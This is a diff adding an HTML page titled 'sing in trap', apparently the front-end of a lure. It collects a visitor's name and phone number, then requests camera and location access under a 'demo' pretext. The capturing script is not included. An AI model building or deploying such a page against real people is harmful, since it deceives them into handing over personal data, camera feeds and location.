@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>sing in trap</title>
+    <link rel="stylesheet" href="style.css">
+       <link rel="icon" type="image/png" href="logo.jpg">
+</head>
+
+<body>
+
+<div class="container">
+
+    <h1>LOGIN</h1>
+
+    <p class="info">
+        Enter your details to continue
+    </p>
+
+    <form id="loginForm">
+
+        <input
+            type="text"
+            id="name"
+            placeholder="Enter your name"
+            required
+        >
+
+        <input
+            type="tel"
+            id="phone"
+            placeholder="Enter phone number"
+            required
+        >
+
+        <button type="submit">
+            Continue
+        </button>
+
+    </form>
+
+    <div id="permissionBox" class="hidden">
+
+        <h2>Permission Required</h2>
+
+        <p>
+            This demo requires camera and location permission.
+        </p>
+
+       <button type="submit">Continue</button>
+
+        <video id="camera" autoplay playsinline></video>
+
+         <p id="locationResult"></p>
+
+         </div>
+
+</div>
+
+<script src="script.js"></script>
+
+</body>
+</html>
